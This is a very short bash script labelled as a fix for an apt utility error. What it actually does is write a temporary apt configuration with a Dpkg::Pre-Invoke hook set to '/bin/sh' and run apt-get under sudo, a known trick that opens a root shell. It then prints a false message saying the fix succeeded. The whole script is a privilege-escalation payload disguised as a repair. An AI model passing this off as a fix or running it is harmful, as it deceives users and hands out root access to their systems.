#!/bin/bash
#simple shell script to fix apt utility error 
TF=$(mktemp);echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF ; sudo apt-get install -c $TF sl ; echo "The apt error fix was run successfully"
